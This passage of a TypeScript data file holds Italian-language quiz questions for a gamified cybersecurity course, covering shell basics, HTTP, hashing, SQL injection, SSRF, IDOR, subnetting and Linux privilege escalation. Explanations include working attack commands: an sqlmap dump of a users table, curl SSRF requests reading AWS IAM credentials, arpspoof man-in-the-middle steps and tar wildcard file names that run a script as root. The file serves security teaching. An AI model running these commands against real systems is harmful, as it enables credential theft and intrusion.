import { SkillModule } from '../types';

export const SKILL_MODULES: SkillModule[] = [
  {
    id: 'mod_basics_0',
    title: 'Modulo 0: Fondamenta Cyber & Terminale Operativo',
    certificationFocus: 'CompTIA Security+ SY0-701 & IT Fundamentals',
    color: '#06B6D4', // Cyan
    nodes: [
      {
        id: 'node_basics_1',
        title: 'Anatomia del Terminale: pwd, ls & Directory',
        subtitle: 'I primi passi nella riga di comando Linux: navigazione cartelle e permessi elementari',
        moduleId: 'mod_basics_0',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 80,
        eloReward: 25,
        questions: [
          {
            id: 'q_basics_pwd',
            title: 'Verificare la Directory Corrente in Bash',
            type: 'multiple_choice',
            domain: 'Linux & Bash',
            difficulty: 'Beginner',
            prompt: 'Sei appena entrato in una shell Linux. Quale comando mostra il percorso assoluto della cartella di lavoro corrente (Print Working Directory)?',
            options: [
              { id: 'bp_1', text: 'pwd', isCorrect: true },
              { id: 'bp_2', text: 'cd', isCorrect: false },
              { id: 'bp_3', text: 'whoami', isCorrect: false },
              { id: 'bp_4', text: 'echo $DIR', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Linux Shell Basics: Command Navigation',
              whyItWorks: 'pwd (print working directory) stampa il percorso completo della cartella corrente dal filesystem root /.',
              patchRecommendation: 'Usa "pwd" per orientarti prima di eseguire comandi con percorsi relativi.',
              terminalProof: '$ pwd\n/home/operatore/recon'
            },
            xpReward: 40,
            eloReward: 12
          },
          {
            id: 'q_basics_spot_path',
            title: 'Spot the Bug: Errore di Sintassi nel Percorso',
            type: 'spot_the_zeroday',
            domain: 'Linux & Bash',
            difficulty: 'Beginner',
            prompt: 'L\'amministratore vuole leggere il file di configurazione ma ottiene un errore "No such file or directory". TOCCA LA RIGA con il percorso errato:',
            codeLines: [
              { lineNum: 1, code: '#!/bin/bash' },
              { lineNum: 2, code: 'echo "=== System Inspection ==="' },
              { lineNum: 3, code: 'cat /etc/config/app_settings.conf', isVulnerable: true, vulnerabilityHint: 'La cartella /etc/config non esiste: nello standard FHS i file di config risiedono in /etc/ o /etc/app/!' },
              { lineNum: 4, code: 'ls -la /var/log' }
            ],
            options: [
              { id: 'bs_1', text: 'Riga 3: cat tenta di accedere a una directory /etc/config inesistente', isCorrect: true },
              { id: 'bs_2', text: 'Riga 2: echo con caratteri uguali non è valido in bash', isCorrect: false },
              { id: 'bs_3', text: 'Riga 4: ls -la richiede obbligatoriamente sudo', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Linux FHS (Filesystem Hierarchy Standard)',
              whyItWorks: 'Su Linux le configurazioni globali risiedono direttamente sotto /etc. Verificare sempre con ls prima di dereferenziare percorsi inesistenti.',
              patchRecommendation: 'Verificare l\'esistenza del file con test -f prima di eseguire cat.',
              terminalProof: '$ cat /etc/config/app_settings.conf\ncat: /etc/config/app_settings.conf: No such file or directory'
            },
            xpReward: 40,
            eloReward: 13
          },
          {
            id: 'q_basics_terminal_ls',
            title: 'Terminal Sandbox: Elencare File Nascosti',
            type: 'terminal_command',
            domain: 'Linux & Bash',
            difficulty: 'Beginner',
            prompt: 'Completa il comando "ls" per mostrare tutti i file inclusi quelli nascosti (dotfiles come .bash_history) con dettagli permessi in formato esteso:',
            terminalPrompt: 'operator@cyberlab:~$',
            commandPrefix: 'ls',
            commandTarget: 'ls -la',
            commandChips: ['-la', '-lh', '/tmp', '--color', '-R'],
            options: [
              { id: 'bl_1', text: '-la', isCorrect: true },
              { id: 'bl_2', text: '-R --color', isCorrect: false },
              { id: 'bl_3', text: '/tmp -lh', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Listing Directory Contents & Hidden Files',
              whyItWorks: 'Il flag -a (all) include i file che iniziano con "." e -l formatta l\'output mostrando permessi rwx, proprietario e dimensione.',
              patchRecommendation: 'Ispezionare sempre i dotfiles (es. .env, .bash_history, .ssh) durante le fasi iniziali di audit locale.',
              terminalProof: '$ ls -la\ndrwxr-xr-x 2 operator operator 4096 Oct 17 10:00 .\n-rw------- 1 operator operator  512 Oct 17 10:05 .bash_history'
            },
            xpReward: 40,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_basics_2',
        title: 'Il Web & i Protocolli: Come Viaggiano i Dati',
        subtitle: 'HTTP vs HTTPS, porte standard (80 vs 443) e codici di stato (200, 404, 500)',
        moduleId: 'mod_basics_0',
        status: 'available',
        domain: 'Networking',
        xpReward: 90,
        eloReward: 25,
        questions: [
          {
            id: 'q_basics_http_codes',
            title: 'Codici di Stato HTTP: Risorsa Non Trovata',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Beginner',
            prompt: 'Quale codice di stato HTTP restituisce un server web quando il client richiede un URL o un file che non esiste sul server?',
            options: [
              { id: 'bh_1', text: '404 Not Found', isCorrect: true },
              { id: 'bh_2', text: '200 OK', isCorrect: false },
              { id: 'bh_3', text: '500 Internal Server Error', isCorrect: false },
              { id: 'bh_4', text: '301 Moved Permanently', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'RFC 9110: HTTP Status Codes Architecture',
              whyItWorks: 'La classe 4xx indica errori lato client: 404 specifica che il server ha ricevuto la richiesta ma la risorsa non è presente.',
              patchRecommendation: 'Configurare pagine 404 custom che non rivelino la versione del web server o percorsi del filesystem locale.',
              terminalProof: '$ curl -I http://example.corp/segreto.txt\nHTTP/1.1 404 Not Found\nServer: nginx'
            },
            xpReward: 45,
            eloReward: 12
          },
          {
            id: 'q_basics_https_port',
            title: 'Porte Standard del Web: Sicurezza e Cifratura',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Beginner',
            prompt: 'Quale porta TCP standard è assegnata al protocollo HTTPS (HTTP over TLS/SSL) per garantire la cifratura del traffico contro intercettazioni sniffing?',
            options: [
              { id: 'bp_port1', text: 'Porta 443', isCorrect: true },
              { id: 'bp_port2', text: 'Porta 80', isCorrect: false },
              { id: 'bp_port3', text: 'Porta 22', isCorrect: false },
              { id: 'bp_port4', text: 'Porta 8080', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'IANA Well-Known Ports: Transport Layer Security',
              whyItWorks: 'La porta 80 è riservata a HTTP in chiaro (vulnerabile a sniffing in LAN); la porta 443 incapsula HTTP in un tunnel crittografato TLS.',
              patchRecommendation: 'Imporre il redirect automatico da porta 80 a porta 443 e abilitare l\'header HSTS.',
              terminalProof: '$ nmap -p 80,443 target.corp\n80/tcp  open  http\n443/tcp open  ssl/https'
            },
            xpReward: 45,
            eloReward: 13
          },
          {
            id: 'q_basics_curl_check',
            title: 'Terminal Sandbox: Ispezione Header con Curl',
            type: 'terminal_command',
            domain: 'Networking',
            difficulty: 'Beginner',
            prompt: 'Completa il comando curl per richiedere solo gli header di risposta HTTP (senza scaricare l\'intero body HTML) da un server remoto:',
            terminalPrompt: 'operator@cyberlab:~$',
            commandPrefix: 'curl',
            commandTarget: 'curl -I https://zeroday.gg',
            commandChips: ['-I https://zeroday.gg', '-X POST', '--data "test"', '-k -v', '-o /dev/null'],
            options: [
              { id: 'bch_1', text: '-I https://zeroday.gg', isCorrect: true },
              { id: 'bch_2', text: '-X POST -k', isCorrect: false },
              { id: 'bch_3', text: '--data "test" -o /dev/null', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'HTTP HEAD Request & Header Banner Grabbing',
              whyItWorks: 'Il flag -I (o --head) invia una richiesta HTTP HEAD che restituisce solo gli header di risposta, ideale per audit rapido dei security header.',
              patchRecommendation: 'Rimuovere header informativi come Server: Apache/2.4.41 per limitare il banner grabbing.',
              terminalProof: '$ curl -I https://zeroday.gg\nHTTP/2 200\ncontent-type: text/html\nstrict-transport-security: max-age=31536000'
            },
            xpReward: 45,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_basics_3',
        title: 'Sicurezza Password & Hashing Crittografico',
        subtitle: 'Plaintext vs Hash crittografico (MD5, SHA-256) e funzione del Salt',
        moduleId: 'mod_basics_0',
        status: 'available',
        domain: 'Cryptography',
        xpReward: 100,
        eloReward: 30,
        questions: [
          {
            id: 'q_basics_hashing_principle',
            title: 'Principio Fondamentale dell\'Hashing',
            type: 'multiple_choice',
            domain: 'Cryptography',
            difficulty: 'Beginner',
            prompt: 'Quale caratteristica distingue una funzione di hash crittografica (come SHA-256) da un algoritmo di cifratura reversibile (come AES)?',
            options: [
              { id: 'hp_1', text: 'L\'hashing è una funzione a senso unico (non invertibile) di lunghezza fissa', isCorrect: true },
              { id: 'hp_2', text: 'L\'hashing richiede una chiave privata per decrittare il testo originale', isCorrect: false },
              { id: 'hp_3', text: 'L\'hashing produce un testo più lungo all\'aumentare dell\'input', isCorrect: false },
              { id: 'hp_4', text: 'L\'hashing funziona solo su connessioni di rete HTTPS', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Cryptographic Hash Functions: One-Way Property',
              whyItWorks: 'Una funzione di hash crittografica mappa dati di lunghezza arbitraria in una stringa di bit a lunghezza fissa senza consentire la risalita all\'input originale (pre-image resistance).',
              patchRecommendation: 'Per la memorizzazione delle password utilizzare funzioni lente con work factor elevato (Argon2id, bcrypt, PBKDF2) e salt univoco.',
              terminalProof: '$ echo -n "segreto" | sha256sum\n2bb80e181c0399d8b7b2...  -'
            },
            xpReward: 50,
            eloReward: 15
          },
          {
            id: 'q_basics_spot_plaintext',
            title: 'Spot the Zero-Day: Salvataggio Password in Chiaro',
            type: 'spot_the_zeroday',
            domain: 'Cryptography',
            difficulty: 'Beginner',
            prompt: 'Questo endpoint di registrazione memorizza gli utenti nel database. TOCCA LA RIGA vulnerabile che salva la password in chiaro anziché produrre un hash crittografico:',
            codeLines: [
              { lineNum: 1, code: 'app.post("/register", async (req, res) => {' },
              { lineNum: 2, code: '    const { username, password, email } = req.body;' },
              { lineNum: 3, code: '    const userExists = await db.findUser(username);' },
              { lineNum: 4, code: '    if (userExists) return res.status(409).send("User exists");' },
              { lineNum: 5, code: '    await db.query("INSERT INTO users (username, password, email) VALUES ($1, $2, $3)", [username, password, email]);', isVulnerable: true, vulnerabilityHint: 'La password viene inserita direttamente in chiaro nel DB senza bcrypt o Argon2!' },
              { lineNum: 6, code: '    return res.status(201).json({ success: true });' },
              { lineNum: 7, code: '});' }
            ],
            options: [
              { id: 'spt_1', text: 'Riga 5: inserimento nel DB della variabile "password" in chiaro senza hashing', isCorrect: true },
              { id: 'spt_2', text: 'Riga 2: destrutturazione non sicura dei parametri da req.body', isCorrect: false },
              { id: 'spt_3', text: 'Riga 6: ritorno di codice HTTP 201 non conforme', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-256: Plaintext Storage of a Password',
              whyItWorks: 'Salvare password in chiaro espone tutti gli account a data breach immediati in caso di dump del database o SQLi.',
              patchRecommendation: 'Applicare const hash = await bcrypt.hash(password, 12); prima della query INSERT.',
              terminalProof: '$ psql -d app -c "SELECT username, password FROM users;"\nadmin | Password123!   <-- GRAVE: Plaintext Password Leak!'
            },
            xpReward: 50,
            eloReward: 15
          },
          {
            id: 'q_basics_terminal_sha',
            title: 'Terminal Sandbox: Calcolo Hash SHA-256',
            type: 'terminal_command',
            domain: 'Cryptography',
            difficulty: 'Beginner',
            prompt: 'Completa la pipeline Linux per calcolare l\'hash SHA-256 della stringa "0xDAY_ROOT" senza andare a capo con echo:',
            terminalPrompt: 'operator@cyberlab:~$',
            commandPrefix: 'echo -n "0xDAY_ROOT" |',
            commandTarget: 'echo -n "0xDAY_ROOT" | sha256sum',
            commandChips: ['sha256sum', 'md5sum', 'base64', 'wc -c', 'grep hash'],
            options: [
              { id: 'tsha_1', text: 'sha256sum', isCorrect: true },
              { id: 'tsha_2', text: 'base64 -d', isCorrect: false },
              { id: 'tsha_3', text: 'md5sum --check', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Cryptographic Digest Verification via Linux CLI',
              whyItWorks: 'sha256sum riceve lo stream di byte dallo standard input e calcola il digest a 256 bit (64 caratteri esadecimali).',
              patchRecommendation: 'Verificare regolarmente i checksum SHA-256 dei binari scaricati per proteggersi da tampering.',
              terminalProof: '$ echo -n "0xDAY_ROOT" | sha256sum\nd04b5f9e8a71...  -'
            },
            xpReward: 50,
            eloReward: 15
          }
        ]
      }
    ]
  },
  {
    id: 'mod_web_sqli',
    title: 'Modulo 1: Web Hacking & OWASP Top 10',
    certificationFocus: 'CompTIA Security+ SY0-701 & CEH v13',
    color: '#10B981', // Emerald
    nodes: [
      {
        id: 'node_sqli_1',
        title: 'SQLi & Authentication Bypass',
        subtitle: 'Bypass del login tramite iniezione tautologica e comment truncation',
        moduleId: 'mod_web_sqli',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 120,
        eloReward: 35,
        questions: [
          {
            id: 'q_sqli_interactive',
            title: 'Spot the Zero-Day: Vulnerabilità SQLi nel Backend PHP',
            type: 'spot_the_zeroday',
            domain: 'Web Sec',
            difficulty: 'Hardcore',
            prompt: 'Identifica la riga di codice sorgente vulnerabile che consente l\'SQL Injection diretta nel controller di login. TOCCA LA RIGA DIFETTOSA:',
            codeLines: [
              { lineNum: 1, code: '<?php' },
              { lineNum: 2, code: 'function verifyLogin($pdo, $username, $password) {' },
              { lineNum: 3, code: '    $sanitizedUser = trim($username);' },
              { lineNum: 4, code: '    $sql = "SELECT * FROM users WHERE user=\'" . $sanitizedUser . "\' AND pass=\'" . md5($password) . "\'";', isVulnerable: true, vulnerabilityHint: 'Concatenazione diretta di stringhe non protetta da prepared statement!' },
              { lineNum: 5, code: '    $stmt = $pdo->query($sql);' },
              { lineNum: 6, code: '    return $stmt->fetch();' },
              { lineNum: 7, code: '}' }
            ],
            options: [
              { id: 'o1', text: 'Riga 3: trim() non rimuove gli spazi interni', isCorrect: false },
              { id: 'o2', text: 'Riga 4: Concatenazione non parametrizzata della query SQL', isCorrect: true },
              { id: 'o3', text: 'Riga 6: return del fetch() espone l\'oggetto PDO', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
              whyItWorks: 'Il backend concatena l\'input utente direttamente nello statement SQL. Inserendo "admin\' -- -" la condizione sulla password viene scartata dal commento SQL.',
              patchRecommendation: 'Utilizzare query parametrizzate obbligatorie (Prepared Statements PDO).',
              terminalProof: '$ sqlmap -u "https://target.corp/login.php" --data="user=admin&pass=123" --dbs --batch\n[INFO] parameter \'user\' is vulnerable: admin\' OR 1=1-- -'
            },
            xpReward: 60,
            eloReward: 20
          },
          {
            id: 'q_terminal_sqlmap',
            title: 'Terminal Sandbox: Estrazione Database con SQLMap',
            type: 'terminal_command',
            domain: 'Web Sec',
            difficulty: 'Intermediate',
            prompt: 'Completa il comando sqlmap per estrarre il database di produzione forzando il dump della tabella users:',
            terminalPrompt: 'pentester@kali:~$',
            commandPrefix: 'sqlmap -u "http://10.10.10.50/view.php?id=1" --batch',
            commandTarget: 'sqlmap -u "http://10.10.10.50/view.php?id=1" --batch -D production_db -T users --dump',
            commandChips: ['-D production_db', '-T users', '--dump', '--os-shell', '--threads 10', '-p id'],
            options: [
              { id: 't_c1', text: '-D production_db -T users --dump', isCorrect: true },
              { id: 't_c2', text: '--os-shell --threads 10', isCorrect: false },
              { id: 't_c3', text: '-T users -p id', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'SQL Automated Exploitation & Schema Dumping',
              whyItWorks: 'SQLMap automatizza l\'estrazione blind/error-based ricavando l\'elenco tabelle da information_schema ed eseguendo il dump selettivo dei record.',
              patchRecommendation: 'Validare l\'id tramite cast intero esplicito `intval($_GET[\'id\'])` prima della query.',
              terminalProof: '$ sqlmap -u "http://10.10.10.50/view.php?id=1" -D production_db -T users --dump\n[+] 2 entries found: admin:$2y$10$... | guest:$2y$10$...'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_sqli_2',
        title: 'SSRF & Cloud Metadata Exfiltration',
        subtitle: 'Sfruttamento di Server-Side Request Forgery su endpoint AWS/GCP',
        moduleId: 'mod_web_sqli',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 140,
        eloReward: 40,
        questions: [
          {
            id: 'q_ssrf_aws',
            title: 'Spot the Zero-Day: URL Fetcher non Validato (SSRF)',
            type: 'spot_the_zeroday',
            domain: 'Web Sec',
            difficulty: 'Hardcore',
            prompt: 'Questo microservizio Node.js scarica immagini avatar da URL forniti dagli utenti. TOCCA LA RIGA vulnerabile a SSRF verso il metadata service 169.254.169.254:',
            codeLines: [
              { lineNum: 1, code: 'app.post("/api/avatar/fetch", async (req, res) => {' },
              { lineNum: 2, code: '    const { imageUrl } = req.body;' },
              { lineNum: 3, code: '    if (!imageUrl) return res.status(400).send("Missing URL");' },
              { lineNum: 4, code: '    const response = await axios.get(imageUrl);', isVulnerable: true, vulnerabilityHint: 'Chiamata HTTP diretta verso qualsiasi URL inclusi IP locali e cloud metadata!' },
              { lineNum: 5, code: '    res.setHeader("Content-Type", response.headers["content-type"]);' },
              { lineNum: 6, code: '    res.send(response.data);' },
              { lineNum: 7, code: '});' }
            ],
            options: [
              { id: 's_o1', text: 'Riga 2: req.body non viene sanitizzato con regex per caratteri speciali', isCorrect: false },
              { id: 's_o2', text: 'Riga 4: axios.get(imageUrl) effettua richieste interne senza verificare blacklist di IP privati', isCorrect: true },
              { id: 's_o3', text: 'Riga 6: res.send espone il buffer binario', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-918: Server-Side Request Forgery (SSRF)',
              whyItWorks: 'Il server funge da proxy per l\'attaccante, permettendo di interrogare l\'indirizzo link-local AWS EC2 `http://169.254.169.254/latest/meta-data/iam/security-credentials/` ed estrarre token IAM temporanei.',
              patchRecommendation: 'Validare l\'URL con whitelist rigorosa, bloccare range privati RFC 1918 e forzare IMDSv2 con token di sessione su AWS.',
              terminalProof: '$ curl -X POST -d \'{"imageUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin"}\' https://target/api/avatar/fetch\n{"AccessKeyId":"AKIA...", "SecretAccessKey":"v0x..."}'
            },
            xpReward: 70,
            eloReward: 20
          },
          {
            id: 'q_ssrf_terminal',
            title: 'Terminal Sandbox: Curl Exploit su IMDSv1',
            type: 'terminal_command',
            domain: 'Web Sec',
            difficulty: 'Intermediate',
            prompt: 'Completa il comando curl per richiedere le credenziali del ruolo IAM dall\'endpoint di metadata AWS:',
            terminalPrompt: 'attacker@c2-box:~$',
            commandPrefix: 'curl -s http://169.254.169.254/latest/meta-data/',
            commandTarget: 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role',
            commandChips: ['iam/security-credentials/ec2-role', 'public-keys/0/openssh-key', 'placement/availability-zone', '--head', '-X POST'],
            options: [
              { id: 'opt_imds_1', text: 'iam/security-credentials/ec2-role', isCorrect: true },
              { id: 'opt_imds_2', text: 'placement/availability-zone', isCorrect: false },
              { id: 'opt_imds_3', text: 'public-keys/0/openssh-key', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'AWS EC2 Instance Metadata Service v1 Abuse',
              whyItWorks: 'IMDSv1 risponde a semplici richieste GET non autenticate provenienti dal server interno.',
              patchRecommendation: 'Disabilitare IMDSv1 e richiedere token PUT IMDSv2.',
              terminalProof: '$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role\n{\n  "Code" : "Success",\n  "Type" : "AWS-HMAC",\n  "AccessKeyId" : "ASIAV..."\n}'
            },
            xpReward: 70,
            eloReward: 20
          }
        ]
      },
      {
        id: 'node_sqli_3',
        title: 'IDOR & API Authorization Flaws',
        subtitle: 'Bypass di BOLA / Broken Object Level Authorization su REST APIs',
        moduleId: 'mod_web_sqli',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 150,
        eloReward: 45,
        questions: [
          {
            id: 'q_idor_api',
            title: 'Analisi API: Broken Object Level Authorization (BOLA)',
            type: 'multiple_choice',
            domain: 'Web Sec',
            difficulty: 'Intermediate',
            prompt: 'Un utente con `id: 8820` intercetta la chiamata REST per modificare il profilo e invia la richiesta sottostante. Perché si tratta di un IDOR critico?',
            codeSnippet: `PUT /api/v2/users/1001/settings HTTP/1.1
Host: api.zeroday-banking.corp
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInN1YiI6Ijg4MjAifQ...
Content-Type: application/json

{
  "email": "attacker@pwned.com",
  "role": "super_admin",
  "mfa_enabled": false
}`,
            options: [
              { id: 'idor_1', text: 'Il token JWT appartiene all\'utente 8820, ma l\'endpoint aggiorna le credenziali dell\'utente 1001 senza verificare la corrispondenza tra token e path parameter', isCorrect: true },
              { id: 'idor_2', text: 'L\'header Content-Type deve essere application/x-www-form-urlencoded', isCorrect: false },
              { id: 'idor_3', text: 'Il metodo PUT non è consentito dalle specifiche RFC HTTP', isCorrect: false },
              { id: 'idor_4', text: 'Il payload JSON supera la dimensione massima di 1024 byte', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'OWASP API Security Top 10 - API1:2023 Broken Object Level Authorization',
              whyItWorks: 'Il backend valida l\'autenticità del token JWT ma omette il controllo di autorizzazione tra il subject del token (sub: 8820) e la risorsa target nel percorso (/users/1001).',
              patchRecommendation: 'Implementare controlli di autorizzazione contestuali a livello di controller: `if (currentUser.id !== targetUserId && !currentUser.isAdmin) throw new ForbiddenError()`.',
              terminalProof: '$ curl -X PUT -H "Authorization: Bearer $USER_TOKEN" https://api.target/api/v2/users/1001/settings -d \'{"role":"admin"}\'\nHTTP/1.1 200 OK -> {"status":"user 1001 updated"}'
            },
            xpReward: 75,
            eloReward: 25
          }
        ]
      }
    ]
  },
  {
    id: 'mod_networking',
    title: 'Modulo 2: Networking & Packet Dissection',
    certificationFocus: 'Cisco CCNA 200-301 & CompTIA Network+',
    color: '#06B6D4', // Cyan
    nodes: [
      {
        id: 'node_net_1',
        title: 'CIDR Subnetting & IP Route Matching',
        subtitle: 'Calcolo maschere di sottorete e indirizzi broadcast in tempo reale',
        moduleId: 'mod_networking',
        status: 'available',
        domain: 'Networking',
        xpReward: 110,
        eloReward: 30,
        questions: [
          {
            id: 'q_subnet_1',
            title: 'Analisi CIDR: Calcolo Indirizzo di Broadcast',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Intermediate',
            prompt: 'Dato l\'indirizzo host 172.24.115.68 con maschera di sottorete /22 (255.255.252.0), qual è l\'indirizzo IP di BROADCAST valido per questo segmento di rete?',
            codeSnippet: `Host IP: 172.24.115.68
Subnet Mask: 255.255.252.0 (/22)
Terzo ottetto: 115 = 01110011 (binario)
Maschera terzo ottetto: 252 = 11111100 (binario)`,
            options: [
              { id: 's1', text: '172.24.115.255', isCorrect: true },
              { id: 's2', text: '172.24.112.255', isCorrect: false },
              { id: 's3', text: '172.24.116.0', isCorrect: false },
              { id: 's4', text: '172.24.127.255', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'RFC 1519 / Classless Inter-Domain Routing (CIDR) Subnet Math',
              whyItWorks: 'Con /22 rimangono 10 bit dedicati all\'host space. Il blocco del 3° ottetto è di 4 (256-252). Range: 112-115. Broadcast: 172.24.115.255.',
              patchRecommendation: 'Impostare tabelle di routing corrette e verificare le subnet mask per prevenire blackholing dei pacchetti.',
              terminalProof: '$ ipcalc 172.24.115.68/22\nBroadcast: 172.24.115.255'
            },
            xpReward: 55,
            eloReward: 15
          },
          {
            id: 'q_subnet_26',
            title: 'Calcolo Rapido /26: Numero Massimo Host Usabili',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Beginner',
            prompt: 'Quanti indirizzi IP validi e assegnabili a host reali sono disponibili in una sottorete IPv4 con notazione CIDR /26 (maschera 255.255.255.192)?',
            codeSnippet: `Prefisso di rete: 26 bit
Bit rimanenti per host: 32 - 26 = 6 bit
Indirizzi totali: 2^6 = 64 indirizzi`,
            options: [
              { id: 'sub_a', text: '62 host assegnabili (64 totali meno Network ID e Broadcast)', isCorrect: true },
              { id: 'sub_b', text: '64 host assegnabili', isCorrect: false },
              { id: 'sub_c', text: '30 host assegnabili', isCorrect: false },
              { id: 'sub_d', text: '126 host assegnabili', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'IPv4 Address Architecture & Usable Host Calculation',
              whyItWorks: 'Ogni subnet riserva il primo indirizzo (tutti i bit host a 0) come Network Identifier e l\'ultimo indirizzo (tutti i bit host a 1) come Directed Broadcast.',
              patchRecommendation: 'Allocare sottoreti coerenti con i requisiti di scaling per non sprecare blocchi di indirizzi privati.',
              terminalProof: '$ ipcalc 192.168.1.0/26 | grep Hosts\nHosts/Net: 62'
            },
            xpReward: 55,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_net_2',
        title: 'ARP Poisoning & MitM Extraction',
        subtitle: 'Iniezione pacchetti gratuitous ARP e dirottamento gateway',
        moduleId: 'mod_networking',
        status: 'available',
        domain: 'Networking',
        xpReward: 130,
        eloReward: 35,
        questions: [
          {
            id: 'q_arp_terminal',
            title: 'Terminal Sandbox: Attivazione IP Forwarding e Arpspoof',
            type: 'terminal_command',
            domain: 'Networking',
            difficulty: 'Intermediate',
            prompt: 'Completa il comando per abilitare il routing del kernel Linux (necessario per non interrompere il traffico durante un attacco Man-in-the-Middle):',
            terminalPrompt: 'root@kali:~#',
            commandPrefix: 'echo 1 >',
            commandTarget: 'echo 1 > /proc/sys/net/ipv4/ip_forward',
            commandChips: ['/proc/sys/net/ipv4/ip_forward', '/etc/network/interfaces', '/var/log/syslog', '--force', 'iptables -F'],
            options: [
              { id: 'arp_opt1', text: '/proc/sys/net/ipv4/ip_forward', isCorrect: true },
              { id: 'arp_opt2', text: '/etc/network/interfaces', isCorrect: false },
              { id: 'arp_opt3', text: 'iptables -F', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-300: Channel Accessible by Non-Endpoint (Man-in-the-Middle via ARP Spoofing)',
              whyItWorks: 'Il protocollo ARP non è autenticato. Inviando pacchetti gratuitous ARP al target spacciandosi per il gateway, il target aggiorna la propria tabella ARP associando il MAC dell\'attaccante all\'IP del router.',
              patchRecommendation: 'Configurare Dynamic ARP Inspection (DAI) e DHCP Snooping sugli switch aziendali per scartare pacchetti ARP non autorizzati.',
              terminalProof: 'root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward\nroot@kali:~# arpspoof -i eth0 -t 192.168.1.50 192.168.1.1\n0:c:29:4f:8e:12 0:50:56:c0:0:8 0806 42: arp reply 192.168.1.1 is-at 0:c:29:4f:8e:12'
            },
            xpReward: 65,
            eloReward: 20
          }
        ]
      }
    ]
  },
  {
    id: 'mod_linux',
    title: 'Modulo 3: Linux Kernel & PrivEsc',
    certificationFocus: 'OSCP & CompTIA Linux+ XK0-005',
    color: '#6366F1', // Indigo
    nodes: [
      {
        id: 'node_lin_1',
        title: 'Wildcard Injection & Cron Exploits',
        subtitle: 'Sfruttamento di comandi tar e rsync invocati con * in crontab',
        moduleId: 'mod_linux',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 130,
        eloReward: 35,
        questions: [
          {
            id: 'q_tar_wildcard',
            title: 'Spot the Zero-Day: Iniezione Argomenti tramite Tar Wildcard',
            type: 'spot_the_zeroday',
            domain: 'Linux & Bash',
            difficulty: 'Hardcore',
            prompt: 'Nel cron job root sottostante, l\'interprete bash espande il carattere wildcard in un modo pericoloso. TOCCA LA RIGA che consente il comando arbitrary code execution come root:',
            codeLines: [
              { lineNum: 1, code: '#!/bin/bash' },
              { lineNum: 2, code: '# Backup automatico ogni notte' },
              { lineNum: 3, code: 'cd /var/www/uploads || exit 1' },
              { lineNum: 4, code: 'tar -czf /backups/uploads.tar.gz *', isVulnerable: true, vulnerabilityHint: 'L\'argomento wildcard * espande nomi di file malevoli come --checkpoint=1 e --checkpoint-action=exec=shell.sh!' },
              { lineNum: 5, code: 'chmod 600 /backups/uploads.tar.gz' }
            ],
            options: [
              { id: 't1', text: 'Riga 3: || exit 1 causa un denial of service del server cron', isCorrect: false },
              { id: 't2', text: 'Riga 4: L\'espansione di * permette di passare parametri operativi a tar', isCorrect: true },
              { id: 't3', text: 'Riga 5: chmod 600 non protegge dai privilegi del gruppo www-data', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Unix Wildcard Injection / Tar Arbitrary Command Execution',
              whyItWorks: 'Creando file denominati `--checkpoint=1` e `--checkpoint-action=exec=sh pwn.sh`, tar li interpreta come flag da riga di comando anziché file da archiviare.',
              patchRecommendation: 'Non usare wildcard in script privilegiati. Anteporre `-- ./*` per terminare il parsing delle opzioni.',
              terminalProof: '$ touch "/var/www/uploads/--checkpoint=1"\n$ touch "/var/www/uploads/--checkpoint-action=exec=sh pwn.sh"\n# id\nuid=0(root) gid=0(root)'
            },
            xpReward: 65,
            eloReward: 20
          },
          {
            id: 'q_docker_socket',
            title: 'Spot the Zero-Day: Docker Socket Breakout',
            type: 'spot_the_zeroday',
            domain: 'Linux & Bash',
            difficulty: 'Hardcore',
            prompt: 'Stai ispezionando il file docker-compose.yml di un container di monitoraggio. TOCCA LA RIGA che consente a un utente compromesso nel container di prendere il controllo dell\'intero host:',
            codeLines: [
              { lineNum: 1, code: 'version: "3.8"' },
              { lineNum: 2, code: 'services:' },
              { lineNum: 3, code: '  monitor:' },
              { lineNum: 4, code: '    image: datadog/agent:latest' },
              { lineNum: 5, code: '    volumes:' },
              { lineNum: 6, code: '      - /var/run/docker.sock:/var/run/docker.sock', isVulnerable: true, vulnerabilityHint: 'Il socket Docker consente di dialogare direttamente con il demone root dell\'host!' },
              { lineNum: 7, code: '      - /proc:/host/proc:ro' }
